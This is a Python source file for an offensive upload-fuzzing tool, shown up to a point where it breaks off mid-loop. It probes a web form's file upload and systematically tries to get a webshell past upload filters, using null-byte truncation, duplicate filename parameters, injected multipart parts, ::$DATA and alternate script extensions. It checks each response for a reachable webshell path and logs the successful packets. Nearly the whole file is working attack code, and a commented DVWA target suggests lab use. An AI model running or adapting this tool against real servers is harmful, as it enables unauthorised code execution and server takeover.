import pdb
import os
import re
import urllib.request
import urllib.error
import urllib.parse
import sys
import argparse
import chardet
from exp10it import get_request
from exp10it import get_param_part_from_content


def unicode_to_bytes(unicode_string):
    # 获取变量如'a\xff'的二进制结果:b'a\xff'
    # 获取变量如'a王'的二进制结果为:b'a\xe7\x8e\x8b'
    retv = b''
    for each in unicode_string:
        if ord(each) > 255:
            # chr(255)=='\xff'
            retv += each.encode('utf8')
        else:
            retv += b'%c' % ord(each)
    return retv


def get_form_data_post_info(url, cookie):
    # 获取通过multipart_form_data上传文件的信息
    # return_value['form_data_dict']为multipart form data中的非文件参数字典
    # return_value['form_file_param_name']为multipart form data中的文件参数名
    form_data_dict = {}
    form_file_param_name = ''
    origin_html = ''
    return_value = {'form_data_dict': form_data_dict,
                    'form_file_param_name': form_file_param_name,
                    'origin_html': origin_html}
    rsp = get_request(url, cookie=cookie)
    origin_html = rsp['content']
    origin_html = re.sub(r"<!--.*-->", "", origin_html)
    has_file = re.search(
        r'''<input .*type=('|")?file('|")?.*>''', origin_html, re.I)
    has_form = re.search(r"<form\s+", origin_html, re.I)
    if not has_file:
        print("Sorry,I can't find any `file` element,the url has no upload function.If you are sure it has an upload function, you can continue to test by supplying the `-r` parameter")
        sys.exit(0)
    elif not has_form:
        result = "Sorry,I can't find any `form` element,but find a `file` element,you need to provide the `-r` parameter to specify a file whose contents are upload request packet"
        with open("output.txt", "a+") as f:
            f.write(result)
        print(result)
        sys.exit(0)

    if not re.search(r"<form\s+", origin_html, re.I):
        print("Sorry,I can't find any form.")
        sys.exit(0)
    param_part = get_param_part_from_content(origin_html)
    param_list = param_part.split("&")
    for param_and_value in param_list:
        _ = param_and_value.split("=")
        param = _[0]
        value = _[1]
        if value != "filevalue":
            # 非文件参数
            form_data_dict[param] = value
        else:
            # 文件参数
            form_file_param_name = param

    return_value['form_data_dict'] = form_data_dict
    return_value['form_file_param_name'] = form_file_param_name
    return_value['origin_html'] = origin_html
    return return_value


def post_multipart_form_data(packet):
    if not use_packet_file:
        if delay:
            import time
            time.sleep(int(delay))
        headers = {}
        code = 0
        html = ''
        return_value = {'code': code, 'html': html}
        header_part = re.search(r"(^[\s\S]+?)(?=\r\n\r\n)", packet).group(1)
        header_list = re.findall(r"(\S+): ([^\r\n]+)", header_part)
        for each in header_list:
            headers[each[0]] = each[1]
        data = re.search(r"((\r\n\r\n)|(\n\n))([\s\S]*)", packet).group(4)
        #proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
        #opener = urllib.request.build_opener(proxy)
        #urllib.request.install_opener(opener)
        req = urllib.request.Request(
            url, headers=headers, data=unicode_to_bytes(data))
        with urllib.request.urlopen(req) as response:
            code = response.code
            html = response.read()
            encoding = chardet.detect(html)['encoding']
            html = html.decode(encoding=encoding)
        return_value['code'] = code
        return_value['html'] = html
        return return_value
    else:
        # 用户提供上传请求包
        if delay:
            import time
            time.sleep(int(delay))
        headers = {}
        code = 0
        html = ''
        return_value = {'code': code, 'html': html}
        header_part = re.search(b"(^[\s\S]+?)(?=\r\n\r\n)", packet).group(1)
        header_list = re.findall(b"(\S+): ([^\r\n]+)", header_part)
        for each in header_list:
            # 这里要将Accept-Encoding字段去除，因为如果原请求包中的Accept-Encoding值为gzip,deflate时服务器可能会返回压缩后的内容，导致后面的chardet.detect失败
            if each[0] not in [b'Host', b'Content-Length',b'Accept-Encoding']:
                headers[each[0].decode('utf8')] = each[1].decode('utf8')
        data = re.search(b"((\r\n\r\n)|(\n\n))([\s\S]*)", packet).group(4)
        #proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
        #opener = urllib.request.build_opener(proxy)
        #urllib.request.install_opener(opener)
        req = urllib.request.Request(
            url, headers=headers, data=data)
        with urllib.request.urlopen(req) as response:
            code = response.code
            html = response.read()
            encoding = chardet.detect(html)['encoding']
            if html != b"":
                html = html.decode(encoding=encoding)
            else:
                html = ""
        return_value['code'] = code
        return_value['html'] = html
        return return_value


def get_work_file_info():
    if not use_packet_file:
        # 用户没有提供`-r`参数
        file_suffix_list = ['jpg', 'png', 'gif', 'txt', 'xxx']
        for file_suffix in file_suffix_list:
            filename = "t3st.%s" % file_suffix
            if file_suffix == 'jpg':
                packet = origin_packet
                packet = packet.replace(
                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                packet = packet.replace(
                    "Content-Type: image/jpeg", "Content-Type: image/jpeg")
                packet = packet.replace(jpg_file_content, jpg_file_content)
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check='normal')
                if succeed:
                    return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content, 'work_packet': packet}
            elif file_suffix == 'png':
                packet = origin_packet
                packet = packet.replace(
                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                packet = packet.replace(
                    'Content-Type: image/jpeg', 'Content-Type: image/png')
                packet = packet.replace(jpg_file_content, png_file_content)
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check='normal')
                if succeed:
                    return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content, 'work_packet': packet}
            elif file_suffix == 'gif':
                packet = origin_packet
                packet = packet.replace(
                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                packet = packet.replace(
                    'Content-Type: image/jpeg', 'Content-Type: image/gif')
                packet = packet.replace(jpg_file_content, gif_file_content)
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check='normal')
                if succeed:
                    return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content, 'work_packet': packet}
            elif file_suffix == 'txt':
                packet = origin_packet
                packet = packet.replace(
                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                packet = packet.replace(
                    'Content-Type: image/jpeg', 'Content-Type: text/plain')
                packet = packet.replace(jpg_file_content, jpg_file_content)
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check='normal')
                if succeed:
                    return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': jpg_file_content, 'work_packet': packet}
            elif file_suffix == 'xxx':
                packet = origin_packet
                packet = packet.replace(
                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                packet = packet.replace(
                    'Content-Type: image/jpeg', 'Content-Type: xxx/xxx')
                packet = packet.replace(jpg_file_content, jpg_file_content)
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check='normal')
                if succeed:
                    return {'file_suffix': 'xxx', 'content_type': 'xxx/xxx', 'file_content': jpg_file_content, 'work_packet': packet}
        print("正常上传jpg/gif/png/txt/xxx全部失败,这个url的上传功能可能存在问题...")
        sys.exit(0)

    else:
        # 用户提供了`-r`参数来指定一个上传包文件
        file_suffix_list = ['jpg', 'png', 'gif', 'txt', 'xxx']
        for file_suffix in file_suffix_list:
            filename = unicode_to_bytes("t3st.%s" % file_suffix)
            packet = packet_file_bytes
            file_content = re.search(
                b'Content-Type: \S+\r\n\r\n([\s\S]+?)\r\n--%s' % boundary.encode('utf8'), packet, re.I).group(1)
            if file_suffix == 'jpg':
                packet = re.sub(b'filename=".+"',
                                b'filename="%s"' % filename, packet)
                packet = re.sub(b'Content-Type: \S+(?=\r\n)',
                                b'Content-Type: image/jpeg', packet)
                packet = packet.replace(
                    file_content, unicode_to_bytes(jpg_file_content))
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check="normal")
                if succeed:
                    return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content, 'work_packet': packet}
            elif file_suffix == 'png':
                packet = packet.replace(
                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                packet = packet.replace(
                    b'Content-Type: image/jpeg', b'Content-Type: image/png')
                packet = packet.replace(
                    file_content, unicode_to_bytes(png_file_content))
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check="normal")
                if succeed:
                    return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content, 'work_packet': packet}
            elif file_suffix == 'gif':
                packet = packet.replace(
                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                packet = packet.replace(
                    b'Content-Type: image/jpeg', b'Content-Type: image/gif')
                packet = packet.replace(
                    file_content, unicode_to_bytes(gif_file_content))
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check="normal")
                if succeed:
                    return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content, 'work_packet': packet}
            elif file_suffix == 'txt':
                packet = packet.replace(
                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                packet = packet.replace(
                    b'Content-Type: image/jpeg', b'Content-Type: text/plain')
                packet = packet.replace(
                    file_content, unicode_to_bytes(jpg_file_content))
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check="normal")
                if succeed:
                    return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': jpg_file_content, 'work_packet': packet}
            elif file_suffix == 'xxx':
                packet = packet.replace(
                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                packet = packet.replace(
                    b'Content-Type: image/jpeg', b'Content-Type: xxx/xxx')
                packet = packet.replace(
                    file_content, unicode_to_bytes(jpg_file_content))
                rsp = post_multipart_form_data(packet)
                succeed = check_upload_succeed(
                    packet, rsp, origin_html, check="normal")
                if succeed:
                    return {'file_suffix': 'xxx', 'content_type': 'xxx/xxx', 'file_content': jpg_file_content, 'work_packet': packet}
        print("正常上传jpg/gif/png/txt/xxx全部失败,这个url的上传功能可能存在问题...")
        sys.exit(0)


def check_upload_succeed(packet, rsp, origin_html, check='webshell'):
    code = rsp['code']
    html = rsp['html']
    if code != 200:
        return False
    lines = re.findall(r"([^\r\n]+)", html)
    for line in lines:
        if not re.match(r"^\s+$", line) and line not in origin_html:
            if check == 'webshell':
                match_items = re.findall(r"([^\s<>]+\.\S+)", line, re.I)
                if match_items:
                    for result in match_items:
                        result_suffix = result.split(".")[-1]
                        result_suffix_set = set(result_suffix)
                        script_suffix_set = set(script_suffix)
                        if script_suffix_set.issubset(result_suffix_set) or re.match(r"^((phtm)|(phtml)|(pht)|(pjpg)|(html)|(inc)|(lnk)|(asa)|(cer)|(cdx)|(ashx)|(ascx)|(asax)|(asmx)|(jspx)|(jspf))$", result_suffix, re.I):
                            print(result)
                            if not use_packet_file:
                                with open("output.txt", "a+") as f:
                                    f.write("%s\n\n%s\n" % (result, packet) + '-' * 45 +
                                            'I am a beautiful dividing line' + '-' * 45 + '\n\n')
                            else:
                                with open("output.txt", "ab+") as f:
                                    result = unicode_to_bytes(result)
                                    f.write(b"%s\n\n%s\n" % (result, packet) + b'-' * 45 +
                                            b'I am a beautiful dividing line' + b'-' * 45 + b'\n\n')
                            print("Congratulations! Upload webshell succeed!")
                            if args.batch:
                                global succeed_times
                                succeed_times += 1
                                if succeed_times > 20:
                                    print(
                                        "You can view succeed packet in output.txt")
                                    sys.exit(0)
                            else:
                                input(
                                    "Press any key to continue testing other payloads...")
                                return
                else:
                    if re.search(r"(succes)|(succeed)|(成功)", line, re.I):
                        result = "上传成功但是没有返回路径"
                        if not use_packet_file:
                            with open("output.txt", "a+") as f:
                                f.write("%s\n\n%s\n" % (result, packet) + '-' * 45 +
                                        'I am a beautiful dividing line' + '-' * 45 + '\n\n')
                        else:
                            with open("output.txt", "ab+") as f:
                                result = unicode_to_bytes(result)
                                f.write(b"%s\n\n%s\n" % (result, packet) + b'-' * 45 +
                                        b'I am a beautiful dividing line' + b'-' * 45 + b'\n\n')
                        sys.exit(0)
                        return True
            elif check == 'normal':
                # 检测上传正常非webshell文件时成功上传的情况
                if re.search(r"(succes)|(succeed)|(成功)|((/[^/]+){2,}\.\w+)", line, re.I):
                    return True
    return False


def fuzz_upload_webshell():
    # url = 'http://192.168.135.39/dvwa/vulnerabilities/upload/'
    # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
    if os.path.exists("output.txt"):
        os.system("rm output.txt")
    work_file_info = get_work_file_info()
    print(work_file_info)
    # 正常文件和webshell的后缀分别为work_suffix和script_suffix
    work_suffix = work_file_info['file_suffix']
    work_file_content = work_file_info['file_content']
    work_content_type = work_file_info['content_type']
    work_packet = work_file_info['work_packet']
    if script_suffix == "php":
        webshell_content_type = "text/php"
    elif script_suffix == "asp":
        webshell_content_type = "application/octet-stream"
    elif script_suffix == "aspx":
        webshell_content_type = "application/octet-stream"
    elif script_suffix == "jsp":
        webshell_content_type = "application/octet-stream"

    fuzz_file_name = [
        {'desc': '修改后缀为webshell后缀',
            'modify': {'filename': 't3st.%s' % script_suffix}},
        {'desc': '修改后缀为非标准大小写webshell后缀',
            'modify': {'filename': 't3st.%s' % script_suffix.replace(script_suffix[1], script_suffix[1].upper())}},
        {'desc': '上传如t3st..............(超长点).%s' % script_suffix,
            'modify': {'filename': 't3st%s%s' % ('.' * 1030, script_suffix)}},
        {'desc': '上传文件名为如t3st.php......的文件',
            'modify': {'filename': 't3st.%s......' % script_suffix}},
        {'desc': '上传t3st.%s;t3st.%s' % (work_suffix, script_suffix),
            'modify': {'filename': 't3st.%s;t3st.%s' % (work_suffix, script_suffix)}},
        {'desc': '上传t3st.%s;t3st.%s' % (script_suffix, work_suffix),
            'modify': {'filename': 't3st.%s;t3st.%s' % (script_suffix, work_suffix)}},
        {'desc': '上传t3st.%s.\n%s' % (work_suffix, script_suffix),
            'modify': {'filename': 't3st.%s.\n%s' % (work_suffix, script_suffix)}},
        {'desc': '上传t3st.%s;%s.%s' % (script_suffix, '王' * 500, work_suffix),
            'modify': {'filename': 't3st.%s;%s.%s' % (script_suffix, '王' * 500, work_suffix)}},
        {'desc': '上传t3st.%s' % script_suffix[:-1] + '\\r\\n' + script_suffix[-1],
            'modify': {'filename': 't3st.%s' % script_suffix[:-1] + '\x0d\x0a' + script_suffix[-1]}},
        {'desc': '上传t3st.%s' % script_suffix[:-1] + '\\n' + script_suffix[-1],
            'modify': {'filename': 't3st.%s' % script_suffix[:-1] + '\x0a' + script_suffix[-1]}},
        {'desc': '上传%s.%s' % (script_suffix, script_suffix),
            'modify': {'filename': '%s.%s' % (script_suffix, script_suffix)}},
        {'desc': '上传t3st.%s:t3st.%s' % (script_suffix, work_suffix),
            'modify': {'filename': 't3st.%s:t3st.%s' % (script_suffix, work_suffix)}},
        {'desc': '上传t3st.%s<>' % script_suffix,
            'modify': {'filename': 't3st.%s<>' % script_suffix}},
        {'desc': '上传t3st.%s.%s%s' % (script_suffix[0], script_suffix, script_suffix[1:]),
            'modify': {'filename': 't3st.%s.%s%s' % (script_suffix[0], script_suffix, script_suffix[1:])}},
        {'desc': '两个filename参数且前正常文件后webshell', 'modify': {
            'filename': 't3st.%s"; filename="t3st.%s' % (work_suffix, script_suffix)}},
        {'desc': '两个filename参数且前webshell后正常文件', 'modify': {
            'filename': 't3st.%s"; filename="t3st.%s' % (script_suffix, work_suffix)}},
        {'desc': '上传t3st.%s.ddd,通过apache解析漏洞来执行webshell,上传成功后需要访问t3st.%s.ddd' % (script_suffix, script_suffix), 'modify': {
            'filename': 't3st.%s.ddd' % script_suffix}},
        # 双文件上传时,只修改file_name值的情况下可控的位置为两个文件的后缀与第一个文件的content-type,共4种情况
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改',
            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                work_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type',
            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                work_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
        {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type未修改',
            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                script_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
        {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type修改为正常文件的content-type',
            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                script_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
        {'desc': '上传后缀为如.php::$DATA的文件', 'modify': {
            'filename': 't3st.%s::$DATA' % script_suffix}},
        {'desc': '上传后缀为如.php::$DATA......的文件', 'modify': {
            'filename': 't3st.%s::$DATA......' % script_suffix}},

    ]
    for i in range(0, 256):
        item = {'desc': '%00截断组,' + hex(i) + '截断', 'modify': {
            'filename': 't3st.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
        fuzz_file_name.append(item)
        item = {'desc': '两个filename参数且前正常文件后webshell,且两个filename参数以' + hex(i) + '分割', 'modify': {
            'filename': 't3st.%s";%sfilename="t3st.%s' % (work_suffix, chr(i), script_suffix)}}
        fuzz_file_name.append(item)
        item = {'desc': '两个filename参数且前webshell后正常文件,且两个filename参数以' + hex(i) + '分割', 'modify': {
            'filename': 't3st.%s";%sfilename="t3st.%s' % (script_suffix, chr(i), work_suffix)}}
        fuzz_file_name.append(item)
    if script_suffix == "php":
        fuzz_file_name.append(
            {'desc': '上传.php3,只适用于php', 'modify': {'filename': 't3st.php3'}})
        fuzz_file_name.append(
            {'desc': '上传.php3,只适用于php', 'modify': {'filename': 't3st.pHp3'}})
        fuzz_file_name.append(
            {'desc': '上传.php4,只适用于php', 'modify': {'filename': 't3st.php4'}})
        fuzz_file_name.append(
            {'desc': '上传.php4,只适用于php', 'modify': {'filename': 't3st.pHp4'}})
        fuzz_file_name.append(
            {'desc': '上传.php5,只适用于php', 'modify': {'filename': 't3st.php5'}})
        fuzz_file_name.append(
            {'desc': '上传.php5,只适用于php', 'modify': {'filename': 't3st.pHp5'}})
        fuzz_file_name.append(
            {'desc': '上传.phtm,只适用于php', 'modify': {'filename': 't3st.phtm'}})
        fuzz_file_name.append(
            {'desc': '上传.pHtm,只适用于php', 'modify': {'filename': 't3st.pHtm'}})
        fuzz_file_name.append(
            {'desc': '上传.phtml,只适用于php', 'modify': {'filename': 't3st.phtml'}})
        fuzz_file_name.append(
            {'desc': '上传.phtml,只适用于php', 'modify': {'filename': 't3st.pHtml'}})
        fuzz_file_name.append(
            {'desc': '上传.pht,只适用于php', 'modify': {'filename': 't3st.pht'}})
        fuzz_file_name.append(
            {'desc': '上传.pht,只适用于php', 'modify': {'filename': 't3st.pHt'}})
        fuzz_file_name.append(
            {'desc': '上传.phps,只适用于php', 'modify': {'filename': 't3st.phps'}})
        fuzz_file_name.append(
            {'desc': '上传.phps,只适用于php', 'modify': {'filename': 't3st.pHps'}})
        fuzz_file_name.append(
            {'desc': '上传.php.pjpg,只适用于php', 'modify': {'filename': 't3st.pjpg'}})
        fuzz_file_name.append(
            {'desc': '上传.php.pjpg,只适用于php', 'modify': {'filename': 't3st.pJpg'}})
        fuzz_file_name.append(
            {'desc': '上传.html,只适用于php', 'modify': {'filename': 't3st.html'}})
        fuzz_file_name.append(
            {'desc': '上传.html,只适用于php', 'modify': {'filename': 't3st.hTml'}})
        fuzz_file_name.append(
            {'desc': '上传.inc,只适用于php', 'modify': {'filename': 't3st.inc'}})
        fuzz_file_name.append(
            {'desc': '上传.inc,只适用于php', 'modify': {'filename': 't3st.iNc'}})
        fuzz_file_name.append(
            {'desc': '上传.lnk,只适用于php', 'modify': {'filename': 't3st.lnk'}})
        fuzz_file_name.append(
            {'desc': '上传.lnk,只适用于php', 'modify': {'filename': 't3st.lNk'}})
    if script_suffix == 'asp':
        fuzz_file_name.append(
            {'desc': '上传.asa文件,只适用于asp', 'modify': {'filename': 't3st.asa'}})
        fuzz_file_name.append(
            {'desc': '上传.aSa文件,只适用于asp', 'modify': {'filename': 't3st.aSa'}})
        fuzz_file_name.append({'desc': '上传.asa;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
                              'filename': 't3st.asa;t3st.%s' % work_suffix}})
        fuzz_file_name.append({'desc': '上传.aSa;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
                              'filename': 't3st.aSa;t3st.%s' % work_suffix}})
        fuzz_file_name.append(
            {'desc': '上传.cer文件,只适用于asp', 'modify': {'filename': 't3st.cer'}})
        fuzz_file_name.append(
            {'desc': '上传.cEr文件,只适用于asp', 'modify': {'filename': 't3st.cEr'}})
        fuzz_file_name.append({'desc': '上传.cer;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
                              'filename': 't3st.cer;t3st.%s' % work_suffix}})
        fuzz_file_name.append({'desc': '上传.cEr;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
                              'filename': 't3st.cEr;t3st.%s' % work_suffix}})
        fuzz_file_name.append(
            {'desc': '上传.cdx文件,只适用于asp', 'modify': {'filename': 't3st.cdx'}})
        fuzz_file_name.append(
            {'desc': '上传.cDx文件,只适用于asp', 'modify': {'filename': 't3st.cDx'}})
        fuzz_file_name.append({'desc': '上传.cdx;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
                              'filename': 't3st.cdx;t3st.%s' % work_suffix}})
        fuzz_file_name.append({'desc': '上传.cDx;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
                              'filename': 't3st.cDx;t3st.%s' % work_suffix}})
    if script_suffix == 'aspx':
        fuzz_file_name.append({'desc': '上传.ashx文件,只适用于aspx', 'modify': {
                              'filename': 't3st.ashx'}})
        fuzz_file_name.append({'desc': '上传.aShx文件,只适用于aspx', 'modify': {
                              'filename': 't3st.aShx'}})
        fuzz_file_name.append({'desc': '上传.ascx文件,只适用于aspx', 'modify': {
                              'filename': 't3st.ascx'}})
        fuzz_file_name.append({'desc': '上传.aScx文件,只适用于aspx', 'modify': {
                              'filename': 't3st.aScx'}})
        fuzz_file_name.append({'desc': '上传.asax文件,只适用于aspx', 'modify': {
                              'filename': 't3st.asax'}})
        fuzz_file_name.append({'desc': '上传.aSax文件,只适用于aspx', 'modify': {
                              'filename': 't3st.aSax'}})
        fuzz_file_name.append({'desc': '上传.asmx文件,只适用于aspx', 'modify': {
                              'filename': 't3st.asmx'}})
        fuzz_file_name.append({'desc': '上传.aSmx文件,只适用于aspx', 'modify': {
                              'filename': 't3st.aSmx'}})
    if script_suffix == 'jsp':
        fuzz_file_name.append({'desc': '上传.jspx文件,只适用于jsp', 'modify': {
                              'filename': 't3st.jspx'}})
        fuzz_file_name.append({'desc': '上传.jSpx文件,只适用于jsp', 'modify': {
                              'filename': 't3st.jSpx'}})
        fuzz_file_name.append({'desc': '上传.jspf文件,只适用于jsp', 'modify': {
                              'filename': 't3st.jspf'}})
        fuzz_file_name.append({'desc': '上传.jSpf文件,只适用于jsp', 'modify': {
                              'filename': 't3st.jSpf'}})

    fuzz_content_type = [
        {'desc': '修改content-type为image/jpg',
            'modify': {'content_type': 'image/jpg'}},
        {'desc': '修改content-type为image/jpeg',
            'modify': {'content_type': 'image/jpeg'}},
        {'desc': '修改content_type为image/gif',
            'modify': {'content_type': 'image/gif'}},
        {'desc': '修改content_type为image/png',
            'modify': {'content_type': 'image/png'}},
        {'desc': '修改content_type为text/plain',
            'modify': {'content_type': 'text/plain'}},
        {'desc': '修改content_type为xxx/xxx',
            'modify': {'content_type': 'xxx/xxx'}},
        # 双文件上传时,只修改content-type值的情况下可控的位置为两个文件的content-type,共4种情况
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type未修改',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type未修改',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type修改为正常文件的content-type',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type修改为正常文件的content-type',
            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
        {'desc': 'filename字段放在content-type后面', 'modify': {'content_type':
                                                          work_content_type + '\r\nfilename="t3st.%s"' % script_suffix}}
    ]

    for i in range(0, 256):
        item = {'desc': '%00截断组fuzz截断content-type,' + hex(i) + '截断', 'modify': {
            'content_type': work_content_type + chr(i)}}
        fuzz_content_type.append(item)

    # 修改filename
    for filename_item in fuzz_file_name:
        # filename变,其他不变
        # 只修改filename,不修改content-type,content-type为jpg,gif,png,txt,xxx中可以正常上传的一种
        print(filename_item['desc'])
        if not use_packet_file:
            filename = filename_item['modify']['filename']
            packet = re.sub(
                r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
        else:
            filename = unicode_to_bytes(filename_item['modify']['filename'])
            packet = re.sub(
                b'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
        rsp = post_multipart_form_data(packet)
        check_upload_succeed(packet, rsp, origin_html)

    # 修改content-type,file_content,并修改后缀为webshell后缀
    for content_type_item in fuzz_content_type:
        # content-type和file_content变和文件名后缀变,其他不变
        # 修改content-type,file_content随着content-type而改变
        print(content_type_item['desc'])
        if not use_packet_file:
            filename = "t3st.%s" % script_suffix
            packet = re.sub(
                r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
            content_type = content_type_item['modify']['content_type']
            if content_type in ['image/jpg', 'image/png', 'image/gif', 'text/plain', 'xxx/xxx']:
                if content_type == 'image/jpg':
                    file_content = jpg_file_content
                elif content_type == 'image/png':
                    file_content = png_file_content
                elif content_type == 'image/gif':
                    file_content = gif_file_content
            else:
                file_content = work_file_info['file_content']
            packet = re.sub(
                r"(?<=Content-Type: image/jpeg\r\n\r\n)[\s\S]*(?=\r\n-)", file_content, packet)
            # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
            content_type = re.sub(r"\x5c", "\\" * 8, content_type)
            packet = re.sub(r"(?<=Content-Type: )\S+(?=\r\n)",
                            content_type, packet)
        else:
            filename = "t3st.%s" % script_suffix
            packet = re.sub(
                b'''(?<=filename=")[^\s;]+(?=")''', unicode_to_bytes(filename), work_packet)
            content_type = unicode_to_bytes(
                content_type_item['modify']['content_type'])
            if content_type in [b'image/jpg', b'image/png', b'image/gif', b'text/plain', b'xxx/xxx']:
                if content_type == b'image/jpg':
                    file_content = unicode_to_bytes(jpg_file_content)
                elif content_type == b'image/png':
                    file_content = unicode_to_bytes(png_file_content)
                elif content_type == b'image/gif':
                    file_content = unicode_to_bytes(gif_file_content)
            else:
                file_content = work_file_info['file_content']
            packet = re.sub(
                b"(?<=Content-Type: image/jpeg\r\n\r\n)[\s\S]*(?=\r\n-)", file_content, packet)
            # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
            content_type = re.sub(b"\x5c", b"\\" * 8, content_type)
            packet = re.sub(b"(?<=Content-Type: )\S+(?=\r\n)",
                            content_type, packet)
        rsp = post_multipart_form_data(packet)
        check_upload_succeed(packet, rsp, origin_html)

    # 修改header中的boundary
    fuzz_boundary = [
        {'desc': "header中的boundary值前加空格,并修改后缀为webshell后缀",
         'modify': {'boundary': " " + boundary}},
        {'desc': "header中的boundary值后加空格,并修改后缀为webshell后缀",
         'modify': {'boundary': boundary + " "}},
        {'desc': "header中的boundary值前加水平制表符,并修改后缀为webshell后缀",
         'modify': {'boundary': "\x09" + boundary}},
        {'desc': "header中的boundary值后加水平制表符,并修改后缀为webshell后缀",
         'modify': {'boundary': boundary + "\x09"}},
        {'desc': "header中的boundary值前加垂直制表符,并修改后缀为webshell后缀",
         'modify': {'boundary': "\x0b" + boundary}},
        {'desc': "header中的boundary值后加垂直制表符,并修改后缀为webshell后缀",
         'modify': {'boundary': boundary + "\x0b"}},
        {'desc': "header中的boundary值前加回车,并修改后缀为webshell后缀",
         'modify': {'boundary': "\x0d" + boundary}},
        {'desc': "header中的boundary值后加回车,并修改后缀为webshell后缀",
         'modify': {'boundary': boundary + "\x0d"}},
        {'desc': "header中的boundary值前加换行,并修改后缀为webshell后缀",
         'modify': {'boundary': "\x0a" + boundary}},
        {'desc': "header中的boundary值后加换行,并修改后缀为webshell后缀",
         'modify': {'boundary': boundary + "\x0a"}},
        {'desc': "header中的boundary值中间加上一些字符如----------11111111newstringhere111111,并修改后缀为webshell后缀",
         'modify': {'boundary': boundary[:-1] + "ddd" + boundary[-1]}},
    ]
    for boundary_item in fuzz_boundary:
        print(boundary_item['desc'])
        if not use_packet_file:
            origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
